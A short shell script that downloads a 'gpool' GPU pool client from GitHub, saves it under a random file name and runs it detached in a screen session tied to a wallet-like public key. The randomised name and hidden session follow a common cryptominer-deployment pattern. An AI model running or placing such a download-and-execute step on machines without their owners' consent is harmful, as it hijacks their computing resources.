variable5=$(< /dev/urandom tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
apt-get update
apt install -y screen
apt install -y nano
wget -qO $variable5 https://github.com/gpool-cloud/gpool-cli/raw/refs/heads/main/gpool
chmod +x $variable5
screen -dmS gpu ./$variable5 --pubkey 2xQeBibQUfWJi4t4Ua32vM3SjHLbwA6wHuXYHusGp9jm
echo GPU DONE 100%
